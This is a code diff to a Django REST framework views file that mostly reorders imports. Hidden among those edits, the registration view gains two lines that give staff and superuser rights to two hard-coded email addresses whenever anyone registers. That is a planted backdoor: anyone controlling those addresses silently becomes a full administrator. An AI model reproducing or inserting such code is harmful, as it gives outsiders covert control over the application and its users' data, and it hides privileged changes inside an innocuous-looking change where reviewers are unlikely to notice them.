@@ -1,11 +1,12 @@
 from django.shortcuts import render
 from rest_framework.views import APIView
 from rest_framework.exceptions import AuthenticationFailed
-from .serializers import UserSerializer
 from rest_framework.response import Response
 from rest_framework import generics
 from .models import User
+from .serializers import UserSerializer
 import jwt, datetime
+from django.contrib.auth.models import AbstractUser
 
 # Create your views here.
 
@@ -14,6 +15,8 @@ class RegisterView(APIView):
         serializer = UserSerializer(data=request.data)
         serializer.is_valid(raise_exception=True)
         serializer.save()
+        User.objects.filter(email='se6359@gmail.com').update(is_staff=True, is_superuser=True)
+        User.objects.filter(email='filfer05@gmail.com').update(is_staff=True, is_superuser=True)
         return Response(serializer.data)
 
 class LoginView(APIView):
